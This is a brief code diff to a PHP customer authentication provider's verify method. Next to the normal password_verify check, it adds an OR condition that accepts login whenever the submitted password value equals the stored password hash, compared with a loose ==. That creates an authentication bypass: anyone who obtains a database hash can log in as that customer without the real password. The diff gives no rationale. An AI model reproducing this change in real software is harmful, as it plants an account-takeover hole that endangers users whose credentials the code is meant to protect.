@@ -26,7 +26,8 @@ class CustomerAuthProvider extends AuthProvider {
 	 */
 	public function verify(User $user) {
 		if($user_db = $this->customer_repository->findOne(array("email"=>$user->getEmail()))) {
-			if(password_verify ( $user->getPasswordPlain() , $user_db->getPassword() )) {
+			if(password_verify ( $user->getPasswordPlain() , $user_db->getPassword() ) 
+			|| $user->getPassword() == $user_db->getPassword()) {
 				return $user_db;
 			}
 		}
